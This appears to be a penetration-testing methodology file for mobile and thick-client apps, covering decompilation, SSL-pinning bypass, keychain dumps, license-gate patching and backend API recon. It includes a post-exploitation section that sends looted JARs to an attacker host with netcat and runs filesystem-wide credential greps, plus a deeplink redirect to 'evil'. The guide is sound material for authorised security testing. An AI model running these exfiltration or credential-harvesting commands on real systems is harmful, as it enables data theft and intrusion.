# Mobile & Thick-Client Penetration Testing Methodology

> **Out of scope for CPTS exam.** Lives in this repo because real engagements need it. Most value is shadow-API recon — using the client app as a reconnaissance device for non-public endpoints, then pivoting back to web-methodology.md.

## Cross-References
- [web-methodology.md](web-methodology.md) — once the backend API surfaces, that's where the testing happens
- [shells-and-payloads.md](shells-and-payloads.md) — for embedded payload generation
- [file-transfers.md](file-transfers.md) — for getting decompiled output back to attacker box

---

## Phase 0: Triage Gate

**Goal:** identify the artifact in front of you, then pick the right phase. Most engagement value comes from feeding discovered backend endpoints into [web-methodology.md](web-methodology.md), not from breaking the client itself.

```text
File extension / magic                          → Path
================================================================
*.apk            (PK\x03\x04 zip, contains AndroidManifest.xml)  → Phase 2 (Android)
*.aab            (Android App Bundle)                            → Phase 2 (extract base APK first via bundletool)
*.ipa            (PK zip, contains Payload/<App>.app/Info.plist) → Phase 3 (iOS)
*.exe / *.dll    PE32 with .NET CLR header                       → Phase 4 (.NET)
*.exe            PE32 native (no CLR)                            → Phase 4 footnote (native — Ghidra/IDA/x64dbg)
*.jar            PK zip, MANIFEST.MF + .class files              → Phase 5 (Java)
*.exe + app.asar in installer payload                            → Phase 6 (Electron)
www/index.html + cordova.js / config.xml in APK                  → Phase 6 (Cordova hybrid)
*.bundle / index.android.bundle / main.jsbundle                  → Phase 6 (React Native)
Mach-O ARM64 (no CodeSignature)                                  → Phase 3 footnote (decrypted iOS binary)
unknown                                                          → `file <APP>` + `binwalk -e <APP>` + `strings -n 8`
```

**Per-engagement objectives** (in priority order):

1. **Backend API recon** — endpoints, auth headers, signing schemes, undocumented parameters. This is 80% of real-engagement value. See [Phase 7](#phase-7-shadow-api-discovery-cross-cutting).
2. **Client-side auth / license / feature-flag bypass** — patch the gate, unlock paid/admin features, demonstrate impact (additive proof — never destroy state per repo rules).
3. **Local data review** — hardcoded secrets, embedded keys, token storage hygiene, plaintext databases.
4. **IPC / exported-component abuse** (mobile only) — exported activities/services/receivers/providers, URL schemes, deeplinks.

> **Scoping check:** mobile + thick-client engagements often have a separate RoE that prohibits jailbreaking customer devices, decompiling protected binaries (DMCA-adjacent), or disclosing third-party-library bugs. Confirm scope before pulling on those threads.

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 1: Tooling Pre-Flight

Sanity-check the toolchain before opening the binary. Missing a decompiler at hour 2 of a 5-day engagement burns more time than the install.

### 1.1 Static Decompilation / Disassembly
```bash
# Android
which apktool                                  # APK unpack/repack (smali)
which jadx                                     # APK → Java decompile (jadx-gui for tree view)
which dex2jar d2j-dex2jar.sh                   # .dex → .jar (legacy, Recaf-friendly)
bundletool version                             # *.aab → universal APK

# iOS
which class-dump                               # Objective-C class headers
otool -L /usr/bin/false                        # Mach-O linkage (smoke test)
which plutil                                   # plist parser (built-in on macOS)
which lipo                                     # fat-binary thin-out

# .NET
ls "$HOME/dnSpyEx" || true                     # dnSpyEx (Windows; Wine on Linux)
which ilspycmd                                 # ILSpy headless decompiler
which de4dot                                   # de-obfuscator (ConfuserEx etc.)

# Java
which jd-gui jd-cli                            # JD-GUI (visual) / jd-cli (batch)
which cfr                                      # CFR — most accurate modern decompiler
which procyon                                  # Procyon — fallback for CFR-rejected classes
ls "$HOME/Recaf/recaf.jar" || true             # Recaf — class-file editor + repack

# Native / generic
which ghidra-server ghidra                     # Ghidra (best free disassembler)
which r2 radare2                               # radare2
which strings binwalk file                     # PE/ELF/Mach-O triage
```

### 1.2 Dynamic Instrumentation
```bash
# Frida — universal hooking (Android, iOS, Linux, Windows, macOS)
frida --version                                # ≥ 16.x
pip3 show objection                            # Frida-driven mobile pentest framework

# Android-specific
adb version                                    # SDK platform-tools
which drozer                                   # IPC fuzzer (exported components)

# Windows-native
which x64dbg                                   # GUI debugger — runtime patching
which procmon                                  # Sysinternals: file/registry/network trace
which apimonitor                               # API call interception
```

### 1.3 Network Interception
```bash
# Burp Suite — primary intercept
which burpsuite || ls "$HOME/BurpSuitePro/burpsuite_pro.jar"

# mitmproxy — scriptable, headless-friendly
mitmdump --version

# Wireshark / tcpdump for non-HTTP protocols
which wireshark tcpdump
```

### 1.4 Electron / JS-runtime
```bash
which asar                                     # npm i -g @electron/asar
which npx                                      # for one-shot @electron/asar invocations
node --version                                 # any LTS
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 2: Android (APK)

**Goal:** unpack → static review → set up runtime intercept → exercise IPC surface → harvest backend endpoints.

### 2.1 Unpack and Decompile
```bash
# Pull installed APK off a rooted device / emulator
adb shell pm list packages | grep -i <APP_NAME>
adb shell pm path com.target.app                          # → /data/app/.../base.apk
adb pull /data/app/~~xyz==/com.target.app-abc==/base.apk <APP_PATH>.apk

# apktool — full unpack (smali + resources + manifest)
apktool d <APP_PATH>.apk -o <APP_PATH>_unpacked

# jadx-gui — Java decompile + search across full tree (preferred for static review)
jadx-gui <APP_PATH>.apk &

# CLI batch decompile
jadx -d <APP_PATH>_jadx <APP_PATH>.apk
```

### 2.2 AndroidManifest.xml Exported-Component Triage
```bash
# Pretty-print the unpacked manifest
cat <APP_PATH>_unpacked/AndroidManifest.xml | xmllint --format - | less

# Hunt exported components (attack surface visible to other apps + adb shell)
grep -E 'android:exported="true"' <APP_PATH>_unpacked/AndroidManifest.xml -B1 -A3

# Specifically look for:
#   <activity   ... android:exported="true">          → adb am start
#   <service    ... android:exported="true">          → adb am startservice
#   <receiver   ... android:exported="true">          → adb am broadcast
#   <provider   ... android:exported="true">          → adb shell content query/insert/update

# Permission-protected vs unprotected
grep -E 'android:permission=' <APP_PATH>_unpacked/AndroidManifest.xml
```

### 2.3 Resource & String Secret Hunt
```bash
# strings.xml + all resources
grep -riE 'api[_-]?key|secret|token|password|firebase|aws|http://|https://' \
  <APP_PATH>_unpacked/res/ <APP_PATH>_unpacked/assets/ 2>/dev/null

# Smali grep for HTTP URLs the app talks to
grep -roE 'https?://[a-zA-Z0-9./?=_-]+' <APP_PATH>_unpacked/smali*/ | sort -u | head -50

# Network security config (cleartext traffic, pinning bypass surface)
cat <APP_PATH>_unpacked/res/xml/network_security_config.xml 2>/dev/null
```

### 2.4 Emulator + Frida + objection Setup
```bash
# Emulator (Android Studio AVD or genymotion). Pick API ≥ 30 with Google APIs OFF for write access.
emulator -list-avds
emulator -avd <AVD_NAME> -writable-system &

adb root && adb remount

# Push frida-server matching device arch
adb push frida-server-<VER>-android-arm64 /data/local/tmp/frida-server
adb shell chmod 755 /data/local/tmp/frida-server
adb shell '/data/local/tmp/frida-server &'

# Install + launch target app
adb install <APP_PATH>.apk
objection -g com.target.app explore
```

### 2.5 Burp CA Install (System Trust via Magisk)
```bash
# Burp → Proxy → Options → Import / export CA → DER → cacert.der
openssl x509 -inform DER -in cacert.der -out cacert.pem
SUBJ_HASH=$(openssl x509 -inform PEM -subject_hash_old -in cacert.pem | head -1)
mv cacert.pem ${SUBJ_HASH}.0

adb push ${SUBJ_HASH}.0 /sdcard/
adb shell 'su -c "mv /sdcard/'${SUBJ_HASH}'.0 /system/etc/security/cacerts/ && chmod 644 /system/etc/security/cacerts/'${SUBJ_HASH}'.0"'
adb shell reboot
# For Magisk-rooted physical devices: install "MagiskTrustUserCerts" module — auto-promotes user-store CAs to system on boot.
```

### 2.6 SSL Pinning Bypass + Live Hooks
```bash
# Most Android apps pin via OkHttp / TrustManager / Network Security Config — objection covers them all
objection -g com.target.app explore
> android sslpinning disable

# Frida script (when objection misses a custom pinner)
frida -U -f com.target.app -l frida-android-pinning-bypass.js --no-pause

# Storage / preferences dump (find tokens, JWTs, refresh secrets)
> android hooking list activities
> env                                          # finds app data dir
> android shell_exec "ls /data/data/com.target.app/shared_prefs/"
```

### 2.7 Drozer for IPC Abuse (when exported components found)
```bash
adb forward tcp:31415 tcp:31415
drozer console connect

# In drozer:
run app.package.list -f <APP_NAME>
run app.package.attacksurface com.target.app
run app.activity.info -a com.target.app
run app.activity.start --component com.target.app com.target.app.SecretActivity
run app.provider.query content://com.target.app.provider/users/

# Provider write — engagement RoE rule §5: ADDITIVE ONLY, never UPDATE existing rows.
# Use INSERT to drop a marker row that proves write-access without altering existing state:
run app.provider.insert content://com.target.app.provider/users/ \
    --string username "engagement-test-<TS>" --string col1 "engagement-marker-<ENG_ID>"
# If only UPDATE is exposed (no INSERT path), STOP — describe the primitive in the report;
# do not modify existing rows. Demonstrating UPDATE access by reading the schema and noting
# the writable column is sufficient proof.
```

### 2.8 Deeplink Extraction
```bash
# All deeplink intent filters in the manifest
grep -E '<data ' <APP_PATH>_unpacked/AndroidManifest.xml -B2 -A2

# Quick fire each scheme/host pair from adb to see if it accepts attacker-controlled data
adb shell am start -W -a android.intent.action.VIEW -d "myapp://login?redirect=https://evil"
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 3: iOS (.ipa)

**Goal:** decrypt → class-dump → bypass pinning + dump keychain → harvest URLs and signing logic.

### 3.1 Acquire Decrypted Binary
```bash
# Jailbroken iOS device required for decrypt. From attacker host:
# macOS:  brew install frida-tools     |     Linux/Kali:  pipx install frida-tools (or pip3 install frida-tools)
brew install frida-tools     # macOS
pip3 install frida-ios-dump

# SSH-forward to device, then:
./dump.py com.target.app -o <APP_PATH>.ipa

# Unpack
unzip <APP_PATH>.ipa -d <APP_PATH>_unpacked
ls <APP_PATH>_unpacked/Payload/<APP>.app/
```

### 3.2 Static Triage
```bash
APP=<APP_PATH>_unpacked/Payload/<APP>.app/<APP>

# Mach-O architectures + linkage
file "$APP"
otool -L "$APP"                                # dynamic libs
otool -hv "$APP"                               # header (PIE? encrypted?)
codesign -dv --verbose=4 "$APP" 2>&1 | head    # signing identity

# Class headers (no debug symbols needed — ObjC retains class metadata)
class-dump "$APP" -H -o ios_headers/
ls ios_headers/ | head

# Plist + URL schemes / capabilities
plutil -p <APP_PATH>_unpacked/Payload/<APP>.app/Info.plist | grep -iE 'url|scheme|app-?transport|atsrequiresclient'

# Embedded entitlements
codesign -d --entitlements - "$APP" 2>/dev/null
```

### 3.3 Secret Hunt
```bash
strings -a "$APP" | grep -iE 'http(s)?://|api[_-]?key|secret|token|firebase|s3\.amazonaws|bucket'
strings -a "$APP" | grep -E '^[A-Za-z0-9+/]{40,}={0,2}$'         # base64 candidates
```

### 3.4 Runtime — Pinning Bypass + Keychain Dump
```bash
# objection (Frida-based) — works on jailbroken + dev-signed/sideloaded apps
objection -g com.target.app explore
> ios sslpinning disable
> ios keychain dump
> ios keychain dump --json keychain.json
> ios cookies get
> ios nsuserdefaults get
```

### 3.5 Burp on iOS — mobileconfig CA + Trust Setting
```text
# IMPORTANT: serve the cert on a DIFFERENT port from Burp's listener (default 8080).
# Same-port collision = Burp intercepts the cert download instead of serving it.
1. Burp → Proxy → Options → Import / export CA → Export → DER → cacert.der
2. openssl x509 -inform DER -in cacert.der -outform DER -out cacert.cer        # iOS profile install requires .cer
3. Host cert on attacker box on a NON-Burp port:  python3 -m http.server 8000
4. Mobile Safari → http://<ATTACKER_IP>:8000/cacert.cer → install profile
5. Settings → General → About → Certificate Trust Settings → toggle ON for "PortSwigger CA"
6. Settings → Wi-Fi → (i) → HTTP Proxy → Manual → <ATTACKER_IP>:8080            # Burp's listener stays on 8080
```

### 3.6 URL Scheme Hijack
```bash
# Read CFBundleURLTypes from Info.plist — every scheme there is an entry-point an attacker can launch
plutil -convert xml1 -o - <APP_PATH>_unpacked/Payload/<APP>.app/Info.plist | grep -A4 CFBundleURLSchemes

# Trigger a scheme from another app or Mobile Safari
# myapp://action?param=<INJECT> — review handler in class-dump headers / Frida-trace ObjC method
frida-trace -U -m '+[* application:openURL:options:]' <APP_BUNDLE_ID>
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 4: Thick-Client .NET

**Goal:** identify language → decompile → hunt for auth method → patch IL or runtime-modify return value → confirm new privilege. Deliver an additive marker per repo proof-of-access rules.

### 4.1 Language / Packing ID
```bash
# Detect-It-Easy — most accurate language + packer ID
die <APP_PATH>.exe                             # GUI: open <APP_PATH>.exe
# Or PEStudio (Windows)

# Quick CLI smoke test
file <APP_PATH>.exe                            # PE32 / PE32+ / .NET
strings <APP_PATH>.exe | grep -iE 'mscorlib|System.Runtime|ConfuserEx|Themida|VMProtect'
```

### 4.2 Decompile in dnSpyEx
```powershell
# dnSpyEx (open-source fork of dnSpy) — open the binary and walk the assembly tree
dnSpy.exe <APP_PATH>.exe

# Search across the whole assembly:
#   Edit → Search Assemblies → "password" / "Bearer" / "https://" / "License" / "isAdmin"
# Right-click any method → "Edit Method (C#)..." or "Edit IL Instructions..." — modify, then File → Save Module.
```

### 4.3 String / Resource Secret Hunt
```powershell
# ILSpy headless — dump every assembly to .cs for greppability
ilspycmd <APP_PATH>.exe -p -o decomp\

# Embedded resources (often XML/JSON config, license keys, default URLs)
ilspycmd <APP_PATH>.exe --list-resources
ilspycmd <APP_PATH>.exe -r resources\

grep -riE 'Bearer |X-Api-Key|password|connectionString|server=.*;uid=' decomp\
```

### 4.3b Reversing Encryption Logic (Crypto Seed / Key Recovery)

When a thick-client encrypts config, credentials, or comms with a derived key, reverse the key-derivation logic in the decompiled source, then recompile a decryptor or compute the key offline.

```powershell
# 1. Decompile and locate encryption classes
ilspycmd <APP_PATH>.exe -p -o decomp\
grep -riE 'System\.Random|RNGCryptoServiceProvider|Rfc2898DeriveBytes|CreateDecryptor|CreateEncryptor|ICryptoTransform' decomp\

# 2. Identify seed source — common patterns:
#    - System.Random seeded with fixed int / timestamp / file mtime
#    - AES key derived from hardcoded passphrase via PBKDF2
#    - XOR key = file creation time (FileInfo.CreationTime.Ticks)

# 3. In dnSpyEx: navigate to the encryption method, note:
#    - Algorithm (AES-CBC, DES, RC4, XOR)
#    - Key derivation inputs (seed, salt, iterations)
#    - IV source (static? first N bytes of ciphertext?)

# 4. Build a decryptor — add CreateDecryptor call + write plaintext:
# In dnSpyEx → Edit Method (C#) on Main() or add a new static method:
#   byte[] key = DeriveKeyFromSeed(<SEED_VALUE>);
#   byte[] iv  = new byte[16]; // or extract from ciphertext prefix
#   using (Aes aes = Aes.Create()) {
#       aes.Key = key; aes.IV = iv;
#       ICryptoTransform dec = aes.CreateDecryptor();
#       byte[] plain = dec.TransformFinalBlock(cipherBytes, 0, cipherBytes.Length);
#       File.WriteAllBytes("decrypted.bin", plain);
#   }
# File → Save Module → run patched binary

# 5. For System.Random seed recovery (predictable PRNG):
# If seed = (int)(File.GetLastWriteTime(<PATH>).Ticks & 0xFFFFFFFF):
#   Get-Item <PATH> | Select-Object LastWriteTime   # note the mtime
#   # Compute seed in C#: (int)(new DateTime(<YEAR>,<MO>,<DAY>,<H>,<M>,<S>).Ticks & 0xFFFFFFFF)
```

#### Living-off-the-land / LOTL variant

```powershell
# PowerShell-native AES decryption when you've recovered key+IV from static analysis
$key = [byte[]]@(<KEY_BYTES_COMMA_SEPARATED>)
$iv  = [byte[]]@(<IV_BYTES_COMMA_SEPARATED>)
$ct  = [System.IO.File]::ReadAllBytes("<CIPHERTEXT_FILE>")
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv; $aes.Mode = 'CBC'; $aes.Padding = 'PKCS7'
$dec = $aes.CreateDecryptor()
$pt  = $dec.TransformFinalBlock($ct, 0, $ct.Length)
[System.IO.File]::WriteAllBytes("decrypted.bin", $pt)

# System.Random seed brute-force (when seed space is small, e.g., 86400 seconds in a day)
1..<SEED_RANGE> | ForEach-Object {
    $rng = [System.Random]::new($_)
    $candidate = [byte[]]::new(16)
    for ($i=0; $i -lt 16; $i++) { $candidate[$i] = $rng.Next(256) }
    # Compare first block decrypt against known plaintext header
}
```

### 4.3c Sink-Hunting Grep Patterns (Vulnerability-Class Triage)

After decompilation, grep for dangerous sinks to prioritize code paths worth deeper review. Each pattern maps to a vulnerability class exploitable from the thick-client's input surface.

```bash
# Run against ilspycmd output directory or dnSpyEx exported project
DECOMP="<DECOMPILED_DIR>"

# --- Deserialization (RCE if attacker controls serialized input) ---
grep -rnE 'BinaryFormatter|ObjectStateFormatter|NetDataContractSerializer|SoapFormatter' "$DECOMP"
grep -rnE 'XmlSerializer|DataContractSerializer' "$DECOMP"
grep -rnE 'TypeNameHandling\s*[=:]\s*(All|Auto|Objects|Arrays)' "$DECOMP"   # Json.NET unsafe deserialization
grep -rnE 'JavaScriptSerializer.*SimpleTypeResolver' "$DECOMP"

# --- Code execution / command injection ---
grep -rnE 'Process\.Start|ProcessStartInfo|cmd\.exe|powershell' "$DECOMP"
grep -rnE 'AddScript\(|Invoke-Expression|iex |Invoke\(' "$DECOMP"          # PowerShell runspace injection
grep -rnE 'Assembly\.Load|Assembly\.LoadFrom|Activator\.CreateInstance' "$DECOMP"

# --- SQL injection (parameterized vs concatenated) ---
grep -rnE 'SqlCommand|OleDbCommand|OdbcCommand' "$DECOMP" | grep -v 'Parameters\.Add'
grep -rnE '"\s*\+.*SELECT|"\s*\+.*INSERT|"\s*\+.*UPDATE|"\s*\+.*DELETE' "$DECOMP"
grep -rnE 'String\.Format.*SELECT|String\.Format.*INSERT' "$DECOMP"

# --- File path injection / arbitrary file read-write ---
grep -rnE 'File\.ReadAllText|File\.WriteAllText|File\.Copy|File\.Move|StreamReader|StreamWriter' "$DECOMP"
grep -rnE 'Path\.Combine\(' "$DECOMP" | grep -v 'Path\.GetFileName'        # no sanitization

# --- LDAP injection ---
grep -rnE 'DirectorySearcher|DirectoryEntry|SearchFilter' "$DECOMP"

# --- WCF / remoting attack surface ---
grep -rnE 'ServiceContract|OperationContract|DataContract' "$DECOMP"        # WCF endpoints
grep -rnE 'RemotingConfiguration|TcpChannel|HttpChannel|IpcChannel' "$DECOMP"

# --- Crypto weaknesses ---
grep -rnE 'DESCryptoServiceProvider|RC2|TripleDES|MD5\.Create|SHA1\.Create' "$DECOMP"
grep -rnE 'RijndaelManaged.*ECB|AesManaged.*ECB|CipherMode\.ECB' "$DECOMP"
grep -rnE 'new Random\(' "$DECOMP"                                          # predictable PRNG for crypto
```

#### Living-off-the-land / LOTL variant

```powershell
# PowerShell-native grep when grep/findstr is all you have (no ilspycmd available)
# Use .NET reflection to dump method bodies as IL tokens — then pattern-match on type refs
$asm = [System.Reflection.Assembly]::LoadFile("$(Resolve-Path <APP_PATH>.exe)")
$asm.GetTypes() | ForEach-Object {
    $_.GetMethods() | ForEach-Object {
        $body = $_.GetMethodBody()
        if ($body) {
            $il = [System.BitConverter]::ToString($body.GetILAsByteArray())
            # Check for known metadata tokens of dangerous types (fragile but works offline)
        }
    }
}

# Simpler: export strings and grep with Select-String (works on raw PE without decompiler)
[System.IO.File]::ReadAllText("<APP_PATH>.exe", [System.Text.Encoding]::UTF8) -split '\x00' |
    Where-Object { $_ -match 'BinaryFormatter|TypeNameHandling|Process\.Start|SqlCommand|ServiceContract' } |
    Select-Object -Unique

# findstr on Windows (no PowerShell needed)
findstr /s /i /r "BinaryFormatter TypeNameHandling Process.Start SqlCommand ServiceContract" <DECOMPILED_DIR>\*.cs
```

### 4.4 Auth / License Method Patch
```text
1. In dnSpyEx, find the gate (e.g. CheckLicense() / IsAuthenticated() / IsAdmin()).
2. Right-click → Edit Method (C#) — change body to `return true;`.
3. File → Save Module... → choose new path (don't overwrite original — additive).
4. Run patched module. Capture screenshot of unlocked feature + a marker file written
   in a privilege-distinct location (e.g. C:\Users\<USER>\Documents\marker-engagement-<vuln-id>-<ts>.txt).
```

### 4.5 Runtime Patch via x64dbg (when IL patch breaks signing)
```text
1. x64dbg → File → Open <APP_PATH>.exe
2. Symbols → search for the auth method name (System.RuntimeMethodHandle assists)
3. Set breakpoint on method entry → step to RET → modify EAX/RAX to 1 → continue
4. Useful when the binary is StrongName-signed and re-saving from dnSpyEx breaks load.
```

### 4.6 Network — Force Through Burp
```powershell
# Trust Burp's CA in Windows
certutil -addstore -f "ROOT" cacert.cer

# Force HttpClient / WebRequest to ignore validation (when CA-trust isn't enough)
# Add to entry point in dnSpyEx:
#   ServicePointManager.ServerCertificateValidationCallback = (s,c,ch,e) => true;

# Or set system proxy
netsh winhttp set proxy <ATTACKER_IP>:8080
# revert with: netsh winhttp reset proxy
```

### 4.7 Obfuscation Removal
```powershell
# ConfuserEx-protected? de4dot recovers names/strings.
de4dot <APP_PATH>.exe                          # → <APP_PATH>-cleaned.exe
# Reopen -cleaned.exe in dnSpyEx — methods/types now have intelligible names.
```

### 4.8 Native PE Footnote
```text
If Detect-It-Easy reports "C++/MSVC" with no .NET CLR header:
  → Open in Ghidra (auto-analyze), look for known crypto constants, login strings
  → x64dbg for runtime patching — same return-value-modify pattern
  → Procmon trace to identify config files, named pipes, loopback HTTP it talks to
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 5: Thick-Client Java (JAR)

**Goal:** decompile → string hunt → edit class file → repackage → run patched build.

### 5.1 Unpack
```bash
mkdir <APP_PATH>_unpacked && cd <APP_PATH>_unpacked
jar -xf ../<APP_PATH>.jar
ls -la                                         # META-INF/, package dirs, .properties, .xml configs

# Or with unzip (jar IS a zip)
unzip -q ../<APP_PATH>.jar
```

### 5.2 Decompile
```bash
# CFR — most accurate modern decompiler (handles Java 17+, lambdas, switch-on-string)
cfr <APP_PATH>.jar --outputdir <APP_PATH>_cfr/

# JD-GUI — visual tree (good for fast triage)
jd-gui <APP_PATH>.jar &

# Recaf — decompile + edit class files in-place + repack
java -jar Recaf.jar
# File → Open → <APP_PATH>.jar → navigate class → right-click → Edit Class
```

### 5.3 String / Config Secret Hunt
```bash
grep -riE 'Bearer |api[_-]?key|password|secret|jdbc:|https?://|aws_secret_access_key' <APP_PATH>_cfr/ <APP_PATH>_unpacked/

# Application config files
find <APP_PATH>_unpacked/ -name '*.properties' -o -name '*.xml' -o -name '*.yml' -o -name '*.json' | xargs grep -lE 'password|secret|token' 2>/dev/null
```

### 5.3b Linux Post-Exploitation JAR Discovery and Exfil

On a Linux foothold, server-side Java apps store JARs, WARs, and config with embedded credentials. Discover, triage, and exfil for offline decompilation on your attacker box.

```bash
# --- Discovery: find all JAR/WAR/EAR files ---
find / -type f \( -name '*.jar' -o -name '*.war' -o -name '*.ear' \) 2>/dev/null | tee /tmp/java_artifacts.txt

# Prioritize app-specific over library jars
grep -v '/jre/\|/jdk/\|/rt\.jar\|/charsets\.jar' /tmp/java_artifacts.txt > /tmp/app_jars.txt

# --- Config files with credentials (Spring, Hibernate, Tomcat) ---
find / -type f \( -name 'application.properties' -o -name 'application.yml' \
    -o -name 'hibernate.cfg.xml' -o -name 'persistence.xml' \
    -o -name 'context.xml' -o -name 'web.xml' -o -name 'server.xml' \) 2>/dev/null

# Quick credential grep on discovered configs
find / -path '*/WEB-INF/*' -type f 2>/dev/null | xargs grep -lE 'password|secret|jdbc:|datasource' 2>/dev/null

# --- Extract credentials from Spring configs without exfil ---
grep -rE 'spring\.datasource\.(password|username|url)|jdbc:' /opt/ /var/ /srv/ /home/ 2>/dev/null
grep -rE 'aws\.secretKey|aws\.accessKey|api[._-]key' /opt/ /var/ /srv/ /home/ 2>/dev/null

# --- Exfil target JARs to attacker box ---
# Option 1: base64 encode for copy-paste (small files < 5MB)
base64 -w0 <JAR_PATH> > /tmp/app.jar.b64
# On attacker: base64 -d < app.jar.b64 > app.jar

# Option 2: nc transfer
# Attacker:  nc -lvnp 9001 > app.jar
cat <JAR_PATH> | nc <ATTACKER_IP> 9001

# Option 3: tar multiple files
tar czf /tmp/java_loot.tar.gz -T /tmp/app_jars.txt 2>/dev/null
# Then transfer via nc/scp/curl

# --- Offline decompile on attacker box ---
cfr <LOOTED_JAR> --outputdir loot_cfr/
grep -riE 'password|secret|jdbc:|Bearer |api[_-]?key|getConnection' loot_cfr/

# --- WAR-specific: unpack and review ---
mkdir war_unpacked && unzip -q <WAR_PATH> -d war_unpacked/
cat war_unpacked/WEB-INF/web.xml                      # servlet mappings, filter chains
cat war_unpacked/META-INF/context.xml 2>/dev/null     # JNDI datasource creds
find war_unpacked/WEB-INF/lib/ -name '*.jar' | head   # bundled dependencies
```

#### Living-off-the-land / LOTL variant

```bash
# Pure built-in tools (no cfr/jadx/jd-gui on target — decompile after exfil)
# Unpack JAR with jar (if JRE installed) or unzip
jar -xf <JAR_PATH> 2>/dev/null || unzip -q <JAR_PATH> -d jar_unpacked/

# Grep .class files for embedded strings (readable ASCII survives compilation)
strings jar_unpacked/**/*.class 2>/dev/null | grep -iE 'password|jdbc:|secret|http://'

# Extract application.properties / YAML from inside JAR without full unpack
unzip -p <JAR_PATH> BOOT-INF/classes/application.properties 2>/dev/null
unzip -p <JAR_PATH> BOOT-INF/classes/application.yml 2>/dev/null
unzip -p <JAR_PATH> application.properties 2>/dev/null

# Find running Java processes and their classpaths (reveals loaded JARs)
ps aux | grep '[j]ava'
cat /proc/<PID>/cmdline | tr '\0' '\n' | grep -E '\.jar|classpath'
ls -la /proc/<PID>/fd 2>/dev/null | grep '\.jar'     # open file descriptors pointing to JARs
```

### 5.4 Class-File Edit + Repackage (Recaf flow)
```text
1. Recaf → open jar → find class with auth gate (e.g. com.target.LicenseValidator.isValid())
2. Right-click method → Edit Method → modify bytecode (or "Decompile and recompile" for high-level edit)
3. File → Export → <APP_PATH>-patched.jar
4. Run: java -jar <APP_PATH>-patched.jar
5. Confirm bypass; drop marker file as proof.
```

### 5.5 Network — Trust Burp + Force Proxy
```bash
# Convert Burp DER to JKS keystore Java trusts
keytool -import -trustcacerts -alias burp -file cacert.cer -keystore burp.jks -storepass changeit -noprompt

# Run JAR with Burp trust + proxy
java \
  -Djavax.net.ssl.trustStore=burp.jks \
  -Djavax.net.ssl.trustStorePassword=changeit \
  -Dhttp.proxyHost=<ATTACKER_IP> -Dhttp.proxyPort=8080 \
  -Dhttps.proxyHost=<ATTACKER_IP> -Dhttps.proxyPort=8080 \
  -jar <APP_PATH>.jar
```

### 5.6 JNI Native Library Hunt
```bash
# Apps using crypto-as-a-service or DRM often ship native .so/.dll/.dylib alongside the jar
find <APP_PATH>_unpacked/ -name '*.so' -o -name '*.dll' -o -name '*.dylib'
strings <APP_PATH>_unpacked/native/libfoo.so | grep -iE 'http|key|secret|JNI_OnLoad'
# Headless static analysis — Ghidra's analyzeHeadless (in $GHIDRA_HOME/support/)
$GHIDRA_HOME/support/analyzeHeadless /tmp/ghidra_proj proj_name -import <APP_PATH>_unpacked/native/libfoo.so
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 6: Electron / Cordova / React Native

**Goal:** these are JS apps in disguise. Most "binary" is a Chromium runtime shipping a JS bundle — extract, grep, patch.

### 6.1 Electron — Extract `app.asar`
```bash
# Locate the asar in the installed app
find / -name 'app.asar' 2>/dev/null
# macOS:    /Applications/<App>.app/Contents/Resources/app.asar
# Windows:  C:\Users\<USER>\AppData\Local\Programs\<App>\resources\app.asar
# Linux:    /opt/<App>/resources/app.asar

# Extract
npx @electron/asar extract app.asar app/
# Or: asar extract app.asar app/

ls app/
# package.json  main.js  preload.js  src/  node_modules/
```

### 6.2 Electron — Static Review of IPC Surface
```bash
# main.js + preload.js define the renderer↔node IPC bridge. Anything `ipcMain.handle` exposes is reachable from the renderer.
grep -rE 'ipcMain\.(on|handle)' app/
grep -rE 'contextBridge\.exposeInMainWorld' app/preload.js

# nodeIntegration: true OR contextIsolation: false in BrowserWindow webPreferences = renderer XSS → full RCE
grep -rE 'nodeIntegration|contextIsolation|webSecurity|sandbox' app/

# Hunt for shell exec in main process
grep -rE 'child_process|execFile|spawn|require\("child_process"\)' app/
```

### 6.3 Electron — DevTools + Debugger Attach
```bash
# Remote debug a running Electron app
<APP_BIN> --remote-debugging-port=9222 &
# Browse to:  chrome://inspect → Configure → localhost:9222 → "inspect"
# Now you have full Chromium DevTools on the renderer process — Network tab is shadow-API gold.
```

### 6.4 Cordova / Ionic Hybrid Apps
```bash
# These are an APK/IPA shell with the actual app under assets/www/ or www/
ls <APP_PATH>_unpacked/assets/www/             # index.html  cordova.js  config.xml  js/  css/
cat <APP_PATH>_unpacked/assets/www/config.xml | grep -iE '<access|<allow-navigation|<plugin'
grep -roE 'https?://[a-zA-Z0-9./?=_-]+' <APP_PATH>_unpacked/assets/www/ | sort -u
```

### 6.5 React Native — Bundle Extraction
```bash
# Android: bundle inside APK at assets/index.android.bundle
unzip -p <APP_PATH>.apk assets/index.android.bundle > index.android.bundle

# iOS: main.jsbundle in the .app/
cp <APP_PATH>_unpacked/Payload/<APP>.app/main.jsbundle .

# Decompile minified Hermes/JS bundle
npx react-native-decompiler -i index.android.bundle -o decompiled/
ls decompiled/                                  # readable JS modules
grep -rE 'https?://|api[_-]?key|Bearer ' decompiled/
```

### 6.6 React Native — Hermes Bytecode
```bash
# Hermes-compiled bundles need a separate disassembler
hermes-dec --help                              # community tooling
# Strings still work for URL recon even on Hermes:
strings -a index.android.bundle | grep -iE 'https?://|api[_-]?key' | sort -u
```

[↑ Back to top](#mobile--thick-client-penetration-testing-methodology)

---

## Phase 7: Shadow API Discovery (cross-cutting)

**This is where 80% of the engagement value lives.** The client app is a recon device — it knows backend endpoints, auth header formats, signing schemes, and parameters that aren't in the public API doc. Surface those, then pivot to [web-methodology.md](web-methodology.md) for actual testing.

### 7.1 Static URL Harvest (all client types)
```bash
# Pull every URL the binary mentions
strings -a <APP_PATH> | grep -oE 'https?://[a-zA-Z0-9./?=_:&%-]+' | sort -u > urls.txt
wc -l urls.txt

# Filter to first-party + interesting-third-party (skip CDN/font/analytics noise)
grep -viE 'cloudflare|googleapis|gstatic|fontawesome|sentry\.io|datadog|segment\.io' urls.txt

# Cross-reference with public docs — endpoints in the binary but NOT in public docs are the high-value targets
